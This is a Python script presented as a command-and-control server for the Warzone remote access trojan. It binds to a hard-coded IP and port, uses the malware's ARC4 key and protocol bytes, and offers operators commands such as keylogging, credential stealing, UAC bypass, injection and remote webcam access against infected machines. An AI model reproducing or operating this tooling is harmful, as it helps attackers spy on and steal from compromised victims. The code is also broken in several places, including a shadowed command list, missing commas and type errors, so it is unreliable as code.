#!/usr/bin/env python3
#C&C server script for Warzone RAT malware
from socket import *
from art import *
from arc4 import ARC4
import random
import string

commands = ["Keylogger 1", "Process Enumeration", "Drive Informtion",
            "File Enumeration", "Get File Name ??", "Unclear", "Unclear"
            "Unclear", "Unclear", "Remote Webcam", "Remote Webcam 2",
            "Unclear", "Unclear", "ICMP Hole Punching", "Create and Write"
            "Event Handler", "Credential Stealer", "Downloader", "Keylogger 2"
            "Keylogger 3", "Unclear", "Unclear", "Terminate Connection", 
            "Unclear", "Unclear", "Unclear", "Execute File", "Unclear"
            "Not Win10 UAC Bypass", "Win10 UAC Bypass", "Injection", "Unclear"]

def intro():
    tprint('WarzoneCC')
    print('by msaltini \n')

def choices():
    size = input('How many commands do you want to send to the RAT?')
    return size

def list(numInput):
    commands = []

    print("Following are the possible commands that you can run:")
    for i in range(len(commands)):
        print(hex(i * 2), commands[i])
    print("\n")
    
    print("Enter the hex codes for the commands you wish to run.")
    for i in range(numInput):
        hexCode = input()
        if type(hexCode) is int:
            commands.append(input())
        else:
            print("Please enter an integer.")

    return commands

def communicate():
    bufferSize = choices()
    serverPort = 6703
    randomLetter = random.choice(string.ascii_letters)
    arc4 = ARC4('warzone160\x00')

    cc = socket(AF_INET,SOCK_STREAM)
    cc.bind(('195.140.214.82', serverPort))
    cc.listen(1)

    (connectionSocket, addr) = cc.accept()
    print("Established connection from infected machine: ", addr)
    message = "\xe4\x66\xbb\x29"
    message += hex(bufferSize + "\x00\x00\x00")
    message += hex(randomLetter) * 4
    encrMessage = arc4.encrypt(message)
    connectionSocket.send(encrMessage)

    for i in bufferSize:
        commands = list(bufferSize)
        recvMessage = connectionSocket.recv()
        print(arc4.decrypt(recvMessage))
        for i in range(len(commands)):
            connectionSocket.send(arc4.encrypt(hex(commands[i])))
        

def main():
    intro()
    while True:
        exitCode = communicate()
        if exitCode == 0:
            break


if __name__ == "__main__":
    main()